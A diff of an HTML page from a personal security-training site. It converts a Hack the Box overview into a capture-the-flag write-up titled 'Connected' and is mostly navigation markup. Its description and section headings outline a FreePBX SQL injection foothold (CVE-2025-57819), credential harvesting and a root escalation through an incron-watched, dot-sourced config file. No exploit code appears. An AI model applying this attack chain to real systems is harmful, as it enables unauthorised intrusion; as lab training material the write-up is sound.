@@ -6,31 +6,35 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Gamified, hands-on upskilling from cybersecurity fundamentals to advanced scenarios.">
+        <meta name="description" content="FreePBX pre-auth SQL injection (CVE-2025-57819) drops a shell as asterisk. Root is not any of the obvious CVEs — it falls out of an incron watcher that dot-sources an asterisk-writable config file straight into a root shell.">
       
       
         <meta name="author" content="Fudomaru">
       
       
       
+        <link rel="prev" href="../devel/">
+      
+      
+        <link rel="next" href="../../thm/overview/">
       
       
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.5">
     
     
       
-        <title>Hack the Box - Digital Dojo</title>
+        <title>Connected - Digital Dojo</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
   
@@ -114,7 +118,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -138,6 +142,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#connected" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -148,9 +157,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Digital Dojo" class="md-header__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
+    <a href="../../.." title="Digital Dojo" class="md-header__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
       
-  <img src="../../assets/Logonew.png" alt="logo">
+  <img src="../../../assets/Logonew.png" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -167,7 +176,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hack the Box
+              Connected
             
           </span>
         </div>
@@ -270,7 +279,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
   
@@ -291,7 +300,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../foundations/overview/" class="md-tabs__link">
+        <a href="../../../foundations/overview/" class="md-tabs__link">
           
   
   
@@ -311,7 +320,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../security/overview/" class="md-tabs__link">
+        <a href="../../../security/overview/" class="md-tabs__link">
           
   
   
@@ -331,7 +340,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../homelab/overview/" class="md-tabs__link">
+        <a href="../../../homelab/overview/" class="md-tabs__link">
           
   
   
@@ -347,11 +356,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../overview/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../overview/" class="md-tabs__link">
           
   
   
@@ -371,7 +382,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../projects/overview/" class="md-tabs__link">
+        <a href="../../../projects/overview/" class="md-tabs__link">
           
   
   
@@ -391,7 +402,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../notes/overview/" class="md-tabs__link">
+        <a href="../../../notes/overview/" class="md-tabs__link">
           
   
   
@@ -409,7 +420,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../about/" class="md-tabs__link">
+      <a href="../../../about/" class="md-tabs__link">
         
   
   
@@ -444,9 +455,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Digital Dojo" class="md-nav__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
+    <a href="../../.." title="Digital Dojo" class="md-nav__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
       
-  <img src="../../assets/Logonew.png" alt="logo">
+  <img src="../../../assets/Logonew.png" alt="logo">
 
     </a>
     Digital Dojo
@@ -473,7 +484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -550,7 +561,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/overview/" class="md-nav__link">
+      <a href="../../../foundations/overview/" class="md-nav__link">
         
   
   
@@ -578,7 +589,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/networking/" class="md-nav__link">
+      <a href="../../../foundations/networking/" class="md-nav__link">
         
   
   
@@ -656,7 +667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/overview/" class="md-nav__link">
+      <a href="../../../foundations/windows/overview/" class="md-nav__link">
         
   
   
@@ -684,7 +695,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/uefi/" class="md-nav__link">
+      <a href="../../../foundations/windows/uefi/" class="md-nav__link">
         
   
   
@@ -712,7 +723,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/eventviewer/" class="md-nav__link">
+      <a href="../../../foundations/windows/eventviewer/" class="md-nav__link">
         
   
   
@@ -740,7 +751,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/winregistry/" class="md-nav__link">
+      <a href="../../../foundations/windows/winregistry/" class="md-nav__link">
         
   
   
@@ -768,7 +779,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/cli-magic/" class="md-nav__link">
+      <a href="../../../foundations/windows/cli-magic/" class="md-nav__link">
         
   
   
@@ -854,7 +865,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/macos/overview/" class="md-nav__link">
+      <a href="../../../foundations/macos/overview/" class="md-nav__link">
         
   
   
@@ -940,7 +951,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/overview/" class="md-nav__link">
+      <a href="../../../foundations/linux/overview/" class="md-nav__link">
         
   
   
@@ -968,7 +979,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/cli-magic/" class="md-nav__link">
+      <a href="../../../foundations/linux/cli-magic/" class="md-nav__link">
         
   
   
@@ -996,7 +1007,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/system-internals/" class="md-nav__link">
+      <a href="../../../foundations/linux/system-internals/" class="md-nav__link">
         
   
   
@@ -1082,7 +1093,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/overview/" class="md-nav__link">
+      <a href="../../../foundations/protocols/overview/" class="md-nav__link">
         
   
   
@@ -1110,7 +1121,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/arp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/arp/" class="md-nav__link">
         
   
   
@@ -1138,7 +1149,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ip/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ip/" class="md-nav__link">
         
   
   
@@ -1166,7 +1177,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/icmp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/icmp/" class="md-nav__link">
         
   
   
@@ -1194,7 +1205,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/tcp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/tcp/" class="md-nav__link">
         
   
   
@@ -1222,7 +1233,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/udp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/udp/" class="md-nav__link">
         
   
   
@@ -1250,7 +1261,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/tls/" class="md-nav__link">
+      <a href="../../../foundations/protocols/tls/" class="md-nav__link">
         
   
   
@@ -1278,7 +1289,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/dns/" class="md-nav__link">
+      <a href="../../../foundations/protocols/dns/" class="md-nav__link">
         
   
   
@@ -1306,7 +1317,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/smtp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/smtp/" class="md-nav__link">
         
   
   
@@ -1334,7 +1345,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/snmp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/snmp/" class="md-nav__link">
         
   
   
@@ -1362,7 +1373,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ftp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ftp/" class="md-nav__link">
         
   
   
@@ -1390,7 +1401,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ssh/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ssh/" class="md-nav__link">
         
   
   
@@ -1418,7 +1429,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/smb/" class="md-nav__link">
+      <a href="../../../foundations/protocols/smb/" class="md-nav__link">
         
   
   
@@ -1446,7 +1457,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/dhcp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/dhcp/" class="md-nav__link">
         
   
   
@@ -1474,7 +1485,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/http/" class="md-nav__link">
+      <a href="../../../foundations/protocols/http/" class="md-nav__link">
         
   
   
@@ -1502,7 +1513,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/netbios/" class="md-nav__link">
+      <a href="../../../foundations/protocols/netbios/" class="md-nav__link">
         
   
   
@@ -1595,7 +1606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/overview/" class="md-nav__link">
+      <a href="../../../security/overview/" class="md-nav__link">
         
   
   
@@ -1623,7 +1634,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/fundamentals/" class="md-nav__link">
+      <a href="../../../security/fundamentals/" class="md-nav__link">
         
   
   
@@ -1701,7 +1712,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/fundamentals/" class="md-nav__link">
+      <a href="../../../security/pentesting/fundamentals/" class="md-nav__link">
         
   
   
@@ -1729,7 +1740,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/types/" class="md-nav__link">
+      <a href="../../../security/pentesting/types/" class="md-nav__link">
         
   
   
@@ -1757,7 +1768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/structure/" class="md-nav__link">
+      <a href="../../../security/pentesting/structure/" class="md-nav__link">
         
   
   
@@ -1785,7 +1796,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/skills/" class="md-nav__link">
+      <a href="../../../security/pentesting/skills/" class="md-nav__link">
         
   
   
@@ -1813,7 +1824,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/methodologies/" class="md-nav__link">
+      <a href="../../../security/pentesting/methodologies/" class="md-nav__link">
         
   
   
@@ -1849,7 +1860,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/footprinting/" class="md-nav__link">
+      <a href="../../../security/footprinting/" class="md-nav__link">
         
   
   
@@ -1927,7 +1938,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/overview/" class="md-nav__link">
+      <a href="../../../security/exploits/overview/" class="md-nav__link">
         
   
   
@@ -1955,7 +1966,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/xss/" class="md-nav__link">
+      <a href="../../../security/exploits/xss/" class="md-nav__link">
         
   
   
@@ -1983,7 +1994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/hardcoded_secrets/" class="md-nav__link">
+      <a href="../../../security/exploits/hardcoded_secrets/" class="md-nav__link">
         
   
   
@@ -2011,7 +2022,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/idor/" class="md-nav__link">
+      <a href="../../../security/exploits/idor/" class="md-nav__link">
         
   
   
@@ -2039,7 +2050,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/ssrf/" class="md-nav__link">
+      <a href="../../../security/exploits/ssrf/" class="md-nav__link">
         
   
   
@@ -2067,7 +2078,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/sqli/" class="md-nav__link">
+      <a href="../../../security/exploits/sqli/" class="md-nav__link">
         
   
   
@@ -2095,7 +2106,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/missing_authorization/" class="md-nav__link">
+      <a href="../../../security/exploits/missing_authorization/" class="md-nav__link">
         
   
   
@@ -2131,7 +2142,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/privilege-escalation/" class="md-nav__link">
+      <a href="../../../security/privilege-escalation/" class="md-nav__link">
         
   
   
@@ -2209,7 +2220,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/overview/" class="md-nav__link">
+      <a href="../../../security/toolbelt/overview/" class="md-nav__link">
         
   
   
@@ -2237,7 +2248,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/nmap/" class="md-nav__link">
+      <a href="../../../security/toolbelt/nmap/" class="md-nav__link">
         
   
   
@@ -2265,7 +2276,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/searchsploit/" class="md-nav__link">
+      <a href="../../../security/toolbelt/searchsploit/" class="md-nav__link">
         
   
   
@@ -2293,7 +2304,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/schtasks/" class="md-nav__link">
+      <a href="../../../security/toolbelt/schtasks/" class="md-nav__link">
         
   
   
@@ -2321,7 +2332,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/metasploit/" class="md-nav__link">
+      <a href="../../../security/toolbelt/metasploit/" class="md-nav__link">
         
   
   
@@ -2407,7 +2418,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/overview/" class="md-nav__link">
+      <a href="../../../security/playbooks/overview/" class="md-nav__link">
         
   
   
@@ -2435,7 +2446,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/recon/" class="md-nav__link">
+      <a href="../../../security/playbooks/recon/" class="md-nav__link">
         
   
   
@@ -2463,7 +2474,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/js-deobfuscation/" class="md-nav__link">
+      <a href="../../../security/playbooks/js-deobfuscation/" class="md-nav__link">
         
   
   
@@ -2556,7 +2567,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/overview/" class="md-nav__link">
+      <a href="../../../homelab/overview/" class="md-nav__link">
         
   
   
@@ -2584,7 +2595,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/proxmox/" class="md-nav__link">
+      <a href="../../../homelab/proxmox/" class="md-nav__link">
         
   
   
@@ -2612,7 +2623,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/pfsense/" class="md-nav__link">
+      <a href="../../../homelab/pfsense/" class="md-nav__link">
         
   
   
@@ -2640,7 +2651,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/pihole/" class="md-nav__link">
+      <a href="../../../homelab/pihole/" class="md-nav__link">
         
   
   
@@ -2668,7 +2679,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/nginx/" class="md-nav__link">
+      <a href="../../../homelab/nginx/" class="md-nav__link">
         
   
   
@@ -2696,7 +2707,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/paperless-ngx/" class="md-nav__link">
+      <a href="../../../homelab/paperless-ngx/" class="md-nav__link">
         
   
   
@@ -2724,7 +2735,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/gitea/" class="md-nav__link">
+      <a href="../../../homelab/gitea/" class="md-nav__link">
         
   
   
@@ -2752,7 +2763,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../homelab/backups/" class="md-nav__link">
+      <a href="../../../homelab/backups/" class="md-nav__link">
         
   
   
@@ -2784,24 +2795,29 @@
       
   
   
+    
   
   
+  
     
     
     
     
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -2819,7 +2835,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2837,7 +2853,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../overview/" class="md-nav__link">
+      <a href="../../overview/" class="md-nav__link">
         
   
   
@@ -2915,7 +2931,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../overthewire/bandit/" class="md-nav__link">
+      <a href="../../overthewire/bandit/" class="md-nav__link">
         
   
   
@@ -2943,7 +2959,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../overthewire/natas/" class="md-nav__link">
+      <a href="../../overthewire/natas/" class="md-nav__link">
         
   
   
@@ -2976,6 +2992,8 @@
                 
   
   
+    
+  
   
   
     
@@ -2986,11 +3004,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3011,7 +3029,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3029,7 +3047,7 @@
   
   
     <li class="md-nav__item">
-      <a href="overview/" class="md-nav__link">
+      <a href="../overview/" class="md-nav__link">
         
   
   
@@ -3057,7 +3075,7 @@
   
   
     <li class="md-nav__item">
-      <a href="twomillion/" class="md-nav__link">
+      <a href="../twomillion/" class="md-nav__link">
         
   
   
@@ -3085,7 +3103,7 @@
   
   
     <li class="md-nav__item">
-      <a href="blue/" class="md-nav__link">
+      <a href="../blue/" class="md-nav__link">
         
   
   
@@ -3113,7 +3131,7 @@
   
   
     <li class="md-nav__item">
-      <a href="jerry/" class="md-nav__link">
+      <a href="../jerry/" class="md-nav__link">
         
   
   
@@ -3141,7 +3159,7 @@
   
   
     <li class="md-nav__item">
-      <a href="netmon/" class="md-nav__link">
+      <a href="../netmon/" class="md-nav__link">
         
   
   
@@ -3169,7 +3187,7 @@
   
   
     <li class="md-nav__item">
-      <a href="devel/" class="md-nav__link">
+      <a href="../devel/" class="md-nav__link">
         
   
   
@@ -3185,6 +3203,275 @@
   
 
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Connected
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Connected
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#full-port-sweep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Full port sweep
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#version-default-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version + default scripts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walking-the-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walking the app
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fingerprint-freepbx-160407" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fingerprint — FreePBX 16.0.40.7
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold-cve-2025-57819" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold — CVE-2025-57819
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold — CVE-2025-57819">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-bug-is" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the bug is
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-it-by-hand" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Confirming it by hand
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#popping-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Popping the shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stabilising-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stabilising the shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-parade-of-dead-ends" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The parade of dead ends
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#harvesting-credentials-worth-doing-anyway" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Harvesting credentials (worth doing anyway)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-intended-path-incron-a-dot-sourced-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The intended path — incron + a dot-sourced config
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3255,7 +3542,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../thm/overview/" class="md-nav__link">
+      <a href="../../thm/overview/" class="md-nav__link">
         
   
   
@@ -3283,7 +3570,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../thm/billing/" class="md-nav__link">
+      <a href="../../thm/billing/" class="md-nav__link">
         
   
   
@@ -3376,7 +3663,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/overview/" class="md-nav__link">
+      <a href="../../../projects/overview/" class="md-nav__link">
         
   
   
@@ -3454,7 +3741,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/overview/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/overview/" class="md-nav__link">
         
   
   
@@ -3482,7 +3769,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/01-powershell-autodeploy/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/01-powershell-autodeploy/" class="md-nav__link">
         
   
   
@@ -3510,7 +3797,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/02-scripting-upgrade/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/02-scripting-upgrade/" class="md-nav__link">
         
   
   
@@ -3546,7 +3833,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/echosnare/" class="md-nav__link">
+      <a href="../../../projects/echosnare/" class="md-nav__link">
         
   
   
@@ -3574,7 +3861,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/void_linux/" class="md-nav__link">
+      <a href="../../../projects/void_linux/" class="md-nav__link">
         
   
   
@@ -3659,7 +3946,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/overview/" class="md-nav__link">
+      <a href="../../../notes/overview/" class="md-nav__link">
         
   
   
@@ -3687,7 +3974,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/ccna/" class="md-nav__link">
+      <a href="../../../notes/ccna/" class="md-nav__link">
         
   
   
@@ -3765,7 +4052,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/overview/" class="md-nav__link">
+      <a href="../../../notes/media/overview/" class="md-nav__link">
         
   
   
@@ -3793,7 +4080,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
+      <a href="../../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
         
   
   
@@ -3821,7 +4108,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/algorithms-to-live-by/" class="md-nav__link">
+      <a href="../../../notes/media/algorithms-to-live-by/" class="md-nav__link">
         
   
   
@@ -3849,7 +4136,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/12-rules-for-life/" class="md-nav__link">
+      <a href="../../../notes/media/12-rules-for-life/" class="md-nav__link">
         
   
   
@@ -3885,7 +4172,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/warboard/" class="md-nav__link">
+      <a href="../../../notes/warboard/" class="md-nav__link">
         
   
   
@@ -3963,7 +4250,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
+      <a href="../../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
         
   
   
@@ -4006,7 +4293,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../about/" class="md-nav__link">
+      <a href="../../../about/" class="md-nav__link">
         
   
   
@@ -4043,6 +4330,210 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#full-port-sweep" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Full port sweep
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#version-default-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version + default scripts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walking-the-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walking the app
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fingerprint-freepbx-160407" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fingerprint — FreePBX 16.0.40.7
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold-cve-2025-57819" class="md-nav__link">
